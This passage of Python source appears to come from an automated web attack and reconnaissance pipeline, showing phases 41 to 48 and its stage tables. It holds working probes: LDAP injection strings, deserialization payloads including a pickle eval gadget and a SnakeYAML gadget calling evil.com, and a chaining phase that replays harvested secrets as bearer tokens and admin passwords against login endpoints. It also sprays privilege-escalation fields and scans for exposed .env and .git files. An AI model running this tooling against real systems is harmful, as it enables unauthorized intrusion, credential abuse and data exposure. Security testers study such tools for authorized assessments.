            for scheme in ("wss", "ws"):
                ws_url = f"{scheme}://{ws_host_safe}{ws_path}"
                try:
                    import socket as _socket
                    import ssl as _ssl
                    import base64 as _b64
                    import struct as _struct
                    sock = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
                    sock.settimeout(5)
                    port = 443 if scheme == "wss" else 80
                    if ":" in host:
                        try:
                            port = int(host.split(":")[1])
                        except (ValueError, IndexError):
                            pass
                    if scheme == "wss":
                        ctx = _ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = _ssl.CERT_NONE
                        sock = ctx.wrap_socket(sock, server_hostname=host_clean)
                    sock.connect((host_clean, port))
                    ws_key = _b64.b64encode(os.urandom(16)).decode()
                    upgrade_request = (
                        f"GET {ws_path} HTTP/1.1\r\n"
                        f"Host: {ws_host_safe}\r\n"
                        f"Upgrade: websocket\r\n"
                        f"Connection: Upgrade\r\n"
                        f"Sec-WebSocket-Key: {ws_key}\r\n"
                        f"Sec-WebSocket-Version: 13\r\n"
                        f"\r\n"
                    )
                    sock.sendall(upgrade_request.encode())
                    resp = b""
                    try:
                        while True:
                            chunk = sock.recv(4096)
                            if not chunk:
                                break
                            resp += chunk
                    except _socket.timeout:
                        pass
                    sock.close()
                    resp_text = resp.decode("utf-8", errors="ignore")
                    if re.search(r'\b101\b', resp_text) and "Upgrade: websocket" in resp_text:
                        findings.append(f"[websocket-open] {ws_url} — WebSocket upgrade accepted (no auth required)")
                    elif re.search(r'\b101\b', resp_text):
                        findings.append(f"[websocket-found] {ws_url} — WebSocket responded")
                except Exception:
                    continue
    if not findings:
        findings.append("[websocket] No WebSocket endpoints discovered")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"41-WEBSOCKET: {len(findings)} WebSocket probes -> {out}")
    return {"41-WEBSOCKET": str(out), "count": len(findings)}


# ────────────────── Phase 42-LDAP: LDAP Injection Detection ────────────────────
async def phase_42_LDAP(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"42-LDAP"}:
        return {}
    _out = outdir / "ldap_injection.txt"
    if _out.exists() and not force:
        return {"42-LDAP": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 42-LDAP: LDAP injection detection")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "42-LDAP: no URLs; skipping")
        return {"42-LDAP": str(_out), "count": 0}
    findings: List[str] = []
    _l_urlopen = _get_urlopener()
    _l_extra_headers = _extra_headers_dict()
    param_urls = [u for u in all_urls if "=" in u][:_PIPELINE_CFG.sample_urls_ldap]
    _LDAP42_PAYLOADS = ["*", "*)(uid=*))", "*)(|(uid=*", "admin*", "*|uid=*", "*((uid=*", "*)(uid=*"]
    _LDAP42_INDICATORS = ["ldap", "filter", "search error", "malformed", "bad search filter", "protocol error"]
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for pname in qs:
            for payload in _LDAP42_PAYLOADS:
                await _throttle_rate()
                test_qs = qs.copy()
                test_qs[pname] = [payload]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_l_extra_headers})
                    _, _, body_bytes = await _async_urlopen_no_redirect(_l_urlopen, req, timeout=8)
                    body = body_bytes.decode("utf-8", errors="ignore").lower()
                    if any(ind in body for ind in _LDAP42_INDICATORS):
                        findings.append(f"[ldap-candidate] {test_url} param={pname} payload={payload}")
                        break
                except Exception:
                    continue
    if not findings:
        findings.append("[ldap] No LDAP injection candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"42-LDAP: {len(findings)} LDAP probes -> {out}")
    return {"42-LDAP": str(out), "count": len(findings)}


# ────────────────── Phase 43-DESERIAL: Insecure Deserialization Detection ──────
_DESERIAL_PAYLOADS: List[Tuple[str, bytes, str]] = [
    ("PHP", b'O:1:"A":0:{}', "PHP unserialize"),
    ("PHP", b'a:1:{i:0;O:1:"B":0:{}}', "PHP array unserialize"),
    ("Java", b'\xac\xed\x00\x05', "Java serialization (0xACED0005)"),
    ("Java", b'\xac\xed\x00\x05sr\x00\x12java.lang.Runtime', "Java Runtime serialization"),
    ("Python", b'(dp0\nS\'test\'\np1\n.', "Python pickle protocol 0"),
    ("Python", b'\x80\x04\x95\x00\x00\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x8c\x04eval\x93\x00.',
     "Python pickle protocol 4 eval"),
    ("Ruby", b'\x04\x08o:\x08Object\x00', "Ruby Marshal.load"),
    (".NET", b'\x00\x01\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00',
     ".NET BinaryFormatter"),
    ("Node.js", b'{"__proto__":{"admin":true},"rce":"_$$ND_FUNC$$_function(){}"}',
     "Node.js serialize __proto__ pollution"),
    ("YAML", b'!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://evil.com/"]]]]',
     "YAML deserialization (SnakeYAML)"),
]


async def phase_43_DESERIAL(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"43-DESERIAL"}:
        return {}
    _out = outdir / "deserialization.txt"
    if _out.exists() and not force:
        return {"43-DESERIAL": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 43-DESERIAL: insecure deserialization payload probing")
    findings: List[str] = []
    _d_urlopen = _get_urlopener()
    _d_extra_headers = _extra_headers_dict()
    urls_file = outdir / "urls_all.txt"
    all_urls = read_lines(urls_file) if urls_file.exists() else []
    api_targets = list({u.split("?")[0] for u in all_urls
        if any(m in u.lower() for m in ("/api/", "/v1/", "/v2/", "/graphql", "/rpc"))})[:_PIPELINE_CFG.sample_endpoints_deserial]
    if not api_targets:
        api_targets = list({u.split("?")[0] for u in all_urls})[:_PIPELINE_CFG.sample_endpoints_deserial]
    if not api_targets:
        log("warn", "43-DESERIAL: no API endpoints; skipping")
        return {"43-DESERIAL": str(_out), "count": 0}
    for ep in api_targets:
        for lang, payload, desc in _DESERIAL_PAYLOADS:
            try:
                req = urllib.request.Request(ep, data=payload, method="POST",
                    headers={"Content-Type": "application/octet-stream",
                             "User-Agent": "Mozilla/5.0", **_d_extra_headers})
                ds, _, db = await _async_urlopen_no_redirect(_d_urlopen, req, timeout=15)
                body = db.decode("utf-8", errors="ignore").lower()
                if ds in (500, 502, 503, 504):
                    findings.append(f"[deserial-crash] {ep} {lang} -> HTTP {ds} ({desc})")
                elif ds in (200, 201, 302):
                    time_indicators = ["error", "exception", "class", "object", "unserialize", "deserialize",
                                       "stack trace", "warning", "fatal"]
                    if any(ind in body for ind in time_indicators):
                        findings.append(f"[deserial-reflected] {ep} {lang} -> error indicators in response ({desc})")
            except urllib.error.HTTPError as e:
                if e.code in (500, 502, 503, 504, 400):
                    try:
                        err_body = e.read().decode("utf-8", errors="ignore").lower()
                        if any(ind in err_body for ind in ["error", "exception", "class", "object", "stack", "unserialize"]):
                            findings.append(f"[deserial-error] {ep} {lang} -> HTTP {e.code} with error details ({desc})")
                    except Exception:
                        pass
            except Exception:
                continue
    if not findings:
        findings.append("[deserial] No deserialization vulnerabilities detected (may require manual testing)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"43-DESERIAL: {len(findings)} deserialization probes -> {out}")
    return {"43-DESERIAL": str(out), "count": len(findings)}


async def phase_44_CHAIN(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"44-CHAIN"}:
        return {}
    _out = outdir / "chain_correlation.txt"
    if _out.exists() and not force:
        return {"44-CHAIN": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 44-CHAIN: cross-reference findings across phases")
    findings: List[str] = []
    # 1. Test secrets from 15-SECRETS as credentials against auth endpoints from 05-HARVEST
    secrets_file = outdir / "secrets.txt"
    urls_file = outdir / "urls_all.txt"
    secrets: List[str] = []
    if secrets_file.exists():
        for ln in read_lines(secrets_file):
            # Extract potential credential patterns: base64, JWTs, API keys
            if any(k in ln.lower() for k in ("apikey", "api_key", "secret", "token", "password", "jwt", "bearer", "access_key")):
                secrets.append(ln)
    auth_endpoints: List[str] = []
    if urls_file.exists():
        for u in read_lines(urls_file):
            if any(p in u.lower() for p in ("/login", "/auth", "/oauth", "/token", "/signin", "/api/v1/auth")):
                auth_endpoints.append(u)
    if secrets and auth_endpoints:
        _ch_urlopen = _get_urlopener()
        _ch_extra_headers = _extra_headers_dict()
        findings.append(f"credential_test: {len(secrets)} secrets × {len(auth_endpoints)} endpoints")
        for secret in secrets[:_PIPELINE_CFG.sample_endpoints_l]:
            for endpoint in auth_endpoints[:_PIPELINE_CFG.sample_endpoints_l]:
                await _throttle_rate()
                try:
                    # Try the secret as a bearer token
                    req = urllib.request.Request(endpoint, method="GET",
                        headers={"Authorization": f"Bearer {secret.strip()}", "User-Agent": "Mozilla/5.0", **_ch_extra_headers})
                    s, _, _ = await _async_urlopen(_ch_urlopen, req, timeout=10)
                    if s == 200:
                        findings.append(f"[credential-hit] Bearer {secret[:60]}... → HTTP 200 on {endpoint}")
                    # Also try as form-encoded credential
                    data = urllib.parse.urlencode({"username": "admin", "password": secret.strip()}).encode()
                    req2 = urllib.request.Request(endpoint, data=data, method="POST",
                        headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0", **_ch_extra_headers})
                    s2, _, _ = await _async_urlopen(_ch_urlopen, req2, timeout=10)
                    if s2 in (200, 302):
                        findings.append(f"[credential-hit] admin:{secret[:60]}... → HTTP {s2} on {endpoint}")
                except Exception:
                    continue
    # 2. Cross-reference IDOR endpoints with mass-assignment payloads
    idor_file = outdir / "idor.txt"
    if idor_file.exists():
        idor_endpoints: Set[str] = set()
        for ln in read_lines(idor_file):
            for token in ln.split():
                if token.startswith("http"):
                    idor_endpoints.add(token.split("?")[0])
                    break
        if idor_endpoints:
            _ma_urlopen = _get_urlopener()
            _MASS_ASSIGN_VALUES_CHAIN: Dict[str, object] = {
                "admin": True, "is_admin": True, "role": "admin", "roles": ["admin"],
                "permissions": ["admin"], "plan": "enterprise", "tier": "premium",
                "balance": 999999, "points": 999999,
            }
            findings.append(f"idor_mass_assign_test: {len(idor_endpoints)} endpoints")
            for ep in sorted(idor_endpoints)[:_PIPELINE_CFG.sample_endpoints_l]:
                for field, val in _MASS_ASSIGN_VALUES_CHAIN.items():
                    await _throttle_rate()
                    body = json.dumps({field: val}).encode()
                    try:
                        req = urllib.request.Request(ep, data=body, method="POST",
                            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
                        ms, _, _ = await _async_urlopen(_ma_urlopen, req, timeout=8)
                        if ms in (200, 201, 302):
                            findings.append(f"[idor-massassign] {ep} POST {{{field}: {json.dumps(val)}}} → HTTP {ms}")
                    except Exception:
                        continue
    # 3. Check for SSRF-to-LFI chaining
    ssrf_meta = outdir / "ssrf_meta.txt"
    if ssrf_meta.exists():
        for ln in read_lines(ssrf_meta):
            if "credential-exfil" in ln:
                findings.append(f"[chain-ssrf-lfi] SSRF metadata exfiltration: {ln}")
    if not findings:
        findings.append("[result] No cross-phase correlations identified")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"44-CHAIN: {len(findings)} correlations → {out}")
    return {"44-CHAIN": str(_out), "count": len(findings)}


async def phase_45_EVIDENCE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"45-EVIDENCE"}:
        return {}
    _out = outdir / "evidence.txt"
    if _out.exists() and not force:
        return {"45-EVIDENCE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 45-EVIDENCE: capture evidence for all confirmed findings")
    findings: List[str] = []
    _ev_urlopen = _get_urlopener()
    _ev_extra_headers = _extra_headers_dict()
    evidence_dir = ensure(outdir / "evidence_payloads")
    # Scan all phase output files for finding markers
    finding_prefixes = ["[finding]", "[confirmed]", "[lfi-confirmed]", "[credential-hit]",
                        "[idor]", "[credential-exfil]", "[sql-injection]", "[xss]",
                        "[ssti]", "[ssrf]", "[massassign]", "[idor-massassign]"]
    for txt_file in sorted(outdir.glob("*.txt")):
        phase_name = txt_file.stem
        lines = read_lines(txt_file)
        if not lines:
            continue
        captured = 0
        for ln in lines:
            if any(ln.startswith(prefix) for prefix in finding_prefixes):
                timestamp = datetime.now().isoformat(timespec="seconds")
                findings.append(f"[{timestamp}] {phase_name}: {ln}")
                captured += 1
                # Attempt to capture evidence payload from finding line
                for token in ln.split():
                    if token.startswith("http") and "?" in token:
                        evidence_file = evidence_dir / f"{_safe_name(phase_name)}_{captured}.txt"
                        try:
                            req = urllib.request.Request(token, method="GET",
                                headers={"User-Agent": "Mozilla/5.0", **_ev_extra_headers})
                            ev_status, ev_headers, ev_body = await _async_urlopen(_ev_urlopen, req, timeout=10)
                            ev_body_text = ev_body.decode("utf-8", errors="ignore")
                            evidence_file.write_text(
                                f"URL: {token}\n"
                                f"Status: {ev_status}\n"
                                f"Headers: {dict(ev_headers)}\n"
                                f"Body:\n{ev_body_text[:5000]}\n"
                            )
                            findings.append(f"  evidence saved → {evidence_file}")
                        except Exception:
                            pass
                        break
        if captured > 0:
            findings.append(f"  [{phase_name}] {captured} finding(s) captured")
    if not findings:
        findings.append("[result] No finding markers found across phase outputs")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"45-EVIDENCE: {len(findings)} evidence entries → {out}")
    return {"45-EVIDENCE": str(_out), "count": len(findings)}


# ───────────────────────────── pipeline runner ─────────────────────────────

# ─────────── New phases (enhancements) ───────────

async def phase_46_BUCKET(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"46-BUCKET"}:
        return {}
    _out = outdir / "bucket_enum.txt"
    if _out.exists() and not force:
        return {"46-BUCKET": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 46-BUCKET: cloud bucket enumeration (AWS/GCP/Azure)")
    domains = set()
    for key in ("01-RECON", "02-RESOLVE", "04-SCAN"):
        p = prev.get(key)
        if p and isinstance(p, str):
            for ln in read_lines(Path(p)) if Path(p).exists() else []:
                ln = ln.strip().lower()
                if ln:
                    domains.add(ln)
    subs = outdir / "all_subs.txt"
    if subs.exists():
        for ln in read_lines(subs):
            ln = ln.strip().lower()
            if ln:
                domains.add(ln)
    findings: List[str] = []
    seen: Set[str] = set()
    for d in sorted(domains)[:_PIPELINE_CFG.sample_hosts_cloud]:
        base = d.split(".")[0]
        candidates = [
            f"https://{base}.s3.amazonaws.com",
            f"https://{base}-assets.s3.amazonaws.com",
            f"https://{base}-backup.s3.amazonaws.com",
            f"https://{base}-uploads.s3.amazonaws.com",
            f"https://{base}.s3-website-{random.choice(['us-east-1', 'us-west-2', 'eu-west-1'])}.amazonaws.com",
            f"https://{base}.storage.googleapis.com",
            f"https://{base}-assets.storage.googleapis.com",
            f"https://{base}.blob.core.windows.net",
            f"https://{base}-assets.blob.core.windows.net",
            f"https://{base}.digitaloceanspaces.com",
        ]
        for url in candidates:
            if url in seen:
                continue
            seen.add(url)
            try:
                await _throttle_rate()
                req = urllib.request.Request(url, method="HEAD")
                urlopen = _get_urlopener()
                code, _, _ = await _async_urlopen(urlopen, req, timeout=10)
                if code < 400:
                    findings.append(f"[open] {url} (HTTP {code})")
                elif code == 403:
                    findings.append(f"[restricted] {url} (HTTP 403)")
            except Exception:
                continue
    ensure(_out).write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"46-BUCKET: {len(findings)} bucket(s) found")
    return {"46-BUCKET": str(_out), "count": len(findings)}


async def phase_47_CDN(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"47-CDN"}:
        return {}
    _out = outdir / "cdn_detection.txt"
    if _out.exists() and not force:
        return {"47-CDN": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 47-CDN: CDN detection and origin IP discovery")
    hosts = set()
    for key in ("02-RESOLVE", "04-SCAN"):
        p = prev.get(key)
        if p and isinstance(p, str) and Path(p).exists():
            for ln in read_lines(Path(p)):
                ln = ln.strip().lower()
                if ln and _is_valid_hostname(ln):
                    hosts.add(ln)
    resolved = outdir / "resolved.txt"
    if resolved.exists():
        for ln in read_lines(resolved):
            ln = ln.strip().lower()
            if ln and _is_valid_hostname(ln):
                hosts.add(ln)
    findings: List[str] = []
    cdn_signatures = {
        "cloudflare": ["cloudflare", "__cfduid", "cf-ray"],
        "cloudfront": ["cloudfront.net", "x-amz-cf-id"],
        "akamai": ["akamai", "akamaized"],
        "fastly": ["fastly", "x-fastly-request"],
        "incapsula": ["incapsula", "X-Iinfo"],
        "sucuri": ["sucuri", "x-sucuri-id"],
        "stackpath": ["stackpath", "stackpath-cdn"],
        "keycdn": ["keycdn"],
        "cdn77": ["cdn77"],
    }
    for h in sorted(hosts)[:_PIPELINE_CFG.sample_hosts_origin]:
        try:
            await _throttle_rate()
            urlopen = _get_no_redirect_urlopener()
            req = urllib.request.Request(f"https://{h}", method="HEAD")
            code, headers, _ = await _async_urlopen_no_redirect(urlopen, req, timeout=10)
            hdr_str = str(dict(headers)).lower()
            detected = [name for name, sigs in cdn_signatures.items() if any(s in hdr_str for s in sigs)]
            if detected:
                findings.append(f"[CDN] {h}: {', '.join(detected)}")
        except Exception:
            pass
    ensure(_out).write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"47-CDN: {len(findings)} CDN(s) detected")
    return {"47-CDN": str(_out), "count": len(findings)}


async def phase_48_CONTENT(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"48-CONTENT"}:
        return {}
    _out = outdir / "content_discovery.txt"
    if _out.exists() and not force:
        return {"48-CONTENT": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 48-CONTENT: content discovery via common paths")
    hosts = set()
    for key in ("02-RESOLVE", "04-SCAN"):
        p = prev.get(key)
        if p and isinstance(p, str) and Path(p).exists():
            for ln in read_lines(Path(p)):
                ln = ln.strip().lower()
                if ln and _is_valid_hostname(ln):
                    hosts.add(ln)
    targets = outdir / "host_targets.txt"
    if targets.exists():
        for ln in read_lines(targets):
            ln = ln.strip().lower()
            if ln and _is_valid_hostname(ln):
                hosts.add(ln)
    common_paths = [
        "/.env", "/.git/config", "/.git/HEAD", "/admin", "/api", "/backup",
        "/config", "/config.php", "/credentials", "/db", "/debug",
        "/docker-compose.yml", "/dump", "/index.php", "/info.php",
        "/jenkins", "/logs", "/node_modules", "/phpinfo.php",
        "/private", "/robots.txt", "/sitemap.xml", "/sql", "/ssh",
        "/swagger.json", "/swagger-ui.html", "/test", "/uploads",
        "/wp-admin", "/wp-content", "/wp-json", "/wsdl",
    ]
    findings: List[str] = []
    seen_urls: Set[str] = set()
    for h in sorted(hosts)[:_PIPELINE_CFG.sample_hosts_git]:
        for path in common_paths:
            url = f"https://{h}{path}"
            if url in seen_urls:
                continue
            seen_urls.add(url)
            if len(findings) >= _PIPELINE_CFG.sample_urls_fuzz:
                break
            try:
                await _throttle_rate()
                urlopen = _get_urlopener()
                req = urllib.request.Request(url, method="GET")
                code, _, body = await _async_urlopen(urlopen, req, timeout=10)
                if code < 400:
                    size = len(body)
                    findings.append(f"[found] {url} (HTTP {code}, {size}b)")
            except Exception:
                continue
    ensure(_out).write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"48-CONTENT: {len(findings)} path(s) discovered")
    return {"48-CONTENT": str(_out), "count": len(findings)}

PIPELINE = [
    ("00-SCOPE", phase_00_SCOPE, ("domain", "outdir", "t", "only", "skip", "force")),
    ("01-RECON", phase_01_RECON, ("domain", "outdir", "t", "only", "skip", "resume", "force")),
    ("02-RESOLVE", phase_02_RESOLVE, ("domain", "outdir", "t", "only", "skip", "prev", "resume", "force")),
    ("03-PERMUTE", phase_03_PERMUTE, ("domain", "outdir", "t", "only", "skip", "prev", "force")),
    ("04-SCAN", phase_04_SCAN, ("outdir", "t", "only", "skip", "prev", "force")),
    ("04b-TAKEOVER-VALIDATE", phase_04b_TAKEOVER_VALIDATE, ("outdir", "t", "only", "skip", "force")),
    ("05-HARVEST", phase_05_HARVEST, ("outdir", "t", "only", "skip", "prev", "force")),
    ("05b-APISPEC", phase_05b_APISPEC, ("outdir", "t", "only", "skip", "prev", "force")),
    ("06-JSINTEL", phase_06_JSINTEL, ("outdir", "t", "only", "skip", "force")),
    ("07-PARAMS", phase_07_PARAMS, ("outdir", "t", "only", "skip", "prev", "force")),
    ("08-FUZZ", phase_08_FUZZ, ("outdir", "t", "only", "skip", "force")),
    ("09-VULNSCAN", phase_09_VULNSCAN, ("outdir", "t", "only", "skip", "force")),
    ("10-TLSCMS", phase_10_TLSCMS, ("outdir", "t", "only", "skip", "force")),
    ("11-INJECT", phase_11_INJECT, ("outdir", "t", "only", "skip", "oast_domain", "force")),
    ("11b-SQLMAP", phase_11b_SQLMAP, ("outdir", "t", "only", "skip", "prev", "force")),
    ("12-SSTI", phase_12_SSTI, ("outdir", "t", "only", "skip", "prev", "force")),
    ("13-OOB", phase_13_OOB, ("outdir", "t", "only", "skip", "oast", "force")),
    ("14-ORIGIN", phase_14_ORIGIN, ("domain", "outdir", "t", "only", "skip", "prev", "force")),
    ("15-SECRETS", phase_15_SECRETS, ("outdir", "t", "only", "skip", "force")),
    ("16A-AUTHZ", phase_16A_AUTHZ, ("outdir", "t", "only", "skip", "force")),
    ("16B-MASSASSIGN", phase_16B_MASSASSIGN, ("outdir", "t", "only", "skip", "force")),
    ("17-IDOR", phase_17_IDOR, ("outdir", "t", "only", "skip", "prev", "force")),
    ("17B-SSRFMETA", phase_17b_SSRFMETA, ("outdir", "t", "only", "skip", "prev", "force")),
    ("18-CLOUD", phase_18_CLOUD, ("domain", "outdir", "t", "only", "skip", "prev", "force")),
    ("19-GIT", phase_19_GIT, ("domain", "outdir", "t", "only", "skip", "prev", "force")),
    ("20-GRAPHQL", phase_20_GRAPHQL, ("domain", "outdir", "t", "only", "skip", "prev", "force")),
    ("21-WAF", phase_21_WAF, ("domain", "outdir", "t", "only", "skip", "prev", "force")),
    ("22-NOSQLI", phase_22_NOSQLI, ("outdir", "t", "only", "skip", "prev", "force")),
    ("23-RACE", phase_23_RACE, ("outdir", "t", "only", "skip", "prev", "force")),
    ("24-JWT", phase_24_JWT, ("outdir", "t", "only", "skip", "force")),
    ("25-XXE", phase_25_XXE, ("outdir", "t", "only", "skip", "prev", "oast_domain", "force")),
    ("26-CMDINJECT", phase_26_CMDINJECT, ("outdir", "t", "only", "skip", "prev", "force")),
    ("27-SSPP", phase_27_SSPP, ("outdir", "t", "only", "skip", "prev", "force")),
    ("28-CACHED", phase_28_CACHED, ("outdir", "t", "only", "skip", "prev", "force")),
    ("29-DEPCHECK", phase_29_DEPCHECK, ("outdir", "t", "only", "skip", "force")),
    ("30-LFI", phase_30_LFI, ("outdir", "t", "only", "skip", "prev", "force")),
    ("31-OPENREDIR", phase_31_OPENREDIR, ("outdir", "t", "only", "skip", "prev", "force")),
    ("32-CLICKJACK", phase_32_CLICKJACK, ("outdir", "t", "only", "skip", "prev", "force")),
    ("33-CRLF", phase_33_CRLF, ("outdir", "t", "only", "skip", "prev", "force")),
    ("34-RATELIMIT", phase_34_RATELIMIT, ("outdir", "t", "only", "skip", "prev", "force")),
    ("35-CORSADV", phase_35_CORSADV, ("outdir", "t", "only", "skip", "prev", "force")),
    ("36-JWTADV", phase_36_JWTADV, ("outdir", "t", "only", "skip", "prev", "force")),
    ("37-FILEUPLOAD", phase_37_FILEUPLOAD, ("outdir", "t", "only", "skip", "prev", "force")),
    ("38-SMUGGLE", phase_38_SMUGGLE, ("outdir", "t", "only", "skip", "prev", "force")),
    ("39-OAUTH", phase_39_OAUTH, ("outdir", "t", "only", "skip", "prev", "force")),
    ("40-PWRESET", phase_40_PWRESET, ("outdir", "t", "only", "skip", "prev", "force")),
    ("41-WEBSOCKET", phase_41_WEBSOCKET, ("outdir", "t", "only", "skip", "prev", "force")),
    ("42-LDAP", phase_42_LDAP, ("outdir", "t", "only", "skip", "prev", "force")),
    ("43-DESERIAL", phase_43_DESERIAL, ("outdir", "t", "only", "skip", "prev", "force")),
    ("44-CHAIN", phase_44_CHAIN, ("outdir", "t", "only", "skip", "prev", "force")),
    ("45-EVIDENCE", phase_45_EVIDENCE, ("outdir", "t", "only", "skip", "prev", "force")),
    ("46-BUCKET", phase_46_BUCKET, ("outdir", "t", "only", "skip", "prev", "force")),
    ("47-CDN", phase_47_CDN, ("domain", "outdir", "t", "only", "skip", "prev", "force")),
    ("48-CONTENT", phase_48_CONTENT, ("outdir", "t", "only", "skip", "prev", "force")),
]
# Phase weights for progress bar accuracy (heuristic based on typical runtime).
# Heavier phases (subdomain enum, port scan, nuclei, sqlmap, fuzz) contribute
# more to the bar so it doesn't jump to 50% after 5 quick phases then stall.
_PHASE_WEIGHTS: Dict[str, int] = {
    "00-SCOPE": 1,
    "01-RECON": 10,
    "02-RESOLVE": 5,
    "03-PERMUTE": 8,
    "04-SCAN": 10,
    "04b-TAKEOVER-VALIDATE": 3,
    "05-HARVEST": 8,
    "05b-APISPEC": 2,
    "06-JSINTEL": 5,
    "07-PARAMS": 5,
    "08-FUZZ": 10,
    "09-VULNSCAN": 10,
    "10-TLSCMS": 8,
    "11-INJECT": 8,
    "11b-SQLMAP": 10,
    "12-SSTI": 3,
    "13-OOB": 2,
    "14-ORIGIN": 3,
    "15-SECRETS": 5,
    "16A-AUTHZ": 2,
    "16B-MASSASSIGN": 2,
    "17-IDOR": 3,
    "17B-SSRFMETA": 2,
    "18-CLOUD": 3,
    "19-GIT": 5,
    "20-GRAPHQL": 2,
    "21-WAF": 3,
    "22-NOSQLI": 3,
    "23-RACE": 3,
    "24-JWT": 3,
    "25-XXE": 3,
    "26-CMDINJECT": 5,
    "27-SSPP": 2,
    "28-CACHED": 3,
    "29-DEPCHECK": 5,
    "30-LFI": 3,
    "31-OPENREDIR": 2,
    "32-CLICKJACK": 3,
    "33-CRLF": 3,
    "34-RATELIMIT": 2,
    "35-CORSADV": 3,
    "36-JWTADV": 3,
    "37-FILEUPLOAD": 3,
    "38-SMUGGLE": 5,
    "39-OAUTH": 3,
    "40-PWRESET": 3,
    "41-WEBSOCKET": 3,
    "42-LDAP": 2,
    "43-DESERIAL": 3,
    "44-CHAIN": 1,
    "45-EVIDENCE": 3,
    "46-BUCKET": 3,
    "47-CDN": 2,
    "48-CONTENT": 5,
}
# Dependency-ordered execution stages. Phases in the same stage are independent
# of one another (they only read artifacts produced by *earlier* stages, never
# each other's output), so they run concurrently.
# Stage 0 — Discovery: subdomains, DNS, ports (streaming)
# Stage 1 — DNS resolution after subdomain discovery
# Later stages keep producer artifacts in earlier stages than their consumers.
STAGES: List[List[str]] = [
    # Stage 0 — Scope validation (must complete before any discovery)
    ["00-SCOPE"],
    # Stage 0a — Subdomain enumeration (consumes scope_validated.txt from Stage 0)
    ["01-RECON"],
    # Stage 1 — DNS resolution (needs 01-RECON output, which Stage 0 guarantees)
    ["02-RESOLVE"],
    # Stage 2 — Port scanning, WAF detection, subdomain permutation (need resolved hosts/subs)
    ["04-SCAN", "21-WAF", "03-PERMUTE"],
    # Stage 3 — Harvest URLs and validate takeover candidates emitted by 04-SCAN
    ["05-HARVEST", "04b-TAKEOVER-VALIDATE"],
    # Stage 4 — URL consumers: API spec hunting and JS URL extraction need harvested URLs
    ["05b-APISPEC", "06-JSINTEL"],
    # Stage 5 — Deep JS secret/dependency prep needs urls_js.txt from 06-JSINTEL
    ["15-SECRETS"],
    # Stage 6 — Parameter discovery after JS intel/deep secret phases can enrich urls_all.txt
    ["07-PARAMS"],
    # Stage 7 — Fuzzing (throttled by WAF profile)
    ["08-FUZZ"],
    # Stage 8 — Independent parallel scans that don't need parameter corpus
    ["09-VULNSCAN", "10-TLSCMS", "14-ORIGIN", "18-CLOUD", "19-GIT", "20-GRAPHQL"],
    # Stage 9 — Main injection cluster: all consume parameter corpus, run concurrently
    ["11-INJECT", "11b-SQLMAP", "12-SSTI", "22-NOSQLI", "25-XXE", "26-CMDINJECT", "27-SSPP", "42-LDAP", "43-DESERIAL"],
    # Stage 10 — SSRF follow-up (triggers on confirmed SSRF from 11-INJECT)
    ["17B-SSRFMETA"],
    # Stage 11 — Auth-focused cluster
    ["24-JWT", "36-JWTADV"],
    # Stage 12 — Auth tests: consume JWT findings + params from earlier stages
    ["39-OAUTH", "40-PWRESET", "16A-AUTHZ", "16B-MASSASSIGN", "17-IDOR"],
    # Stage 13 — Long tail of independent checks
    ["28-CACHED", "29-DEPCHECK", "30-LFI", "31-OPENREDIR", "32-CLICKJACK", "33-CRLF", "34-RATELIMIT", "35-CORSADV", "37-FILEUPLOAD", "38-SMUGGLE", "41-WEBSOCKET"],
    # Stage 14 — OOB callback collection
    ["13-OOB", "23-RACE"],
    # Stage 15 — Cross-phase correlation
    ["44-CHAIN"],
    # Stage 16 — Evidence capture after correlation has written its findings
    ["45-EVIDENCE"],
    # Stage 17 — New enhancement phases (run after evidence capture)
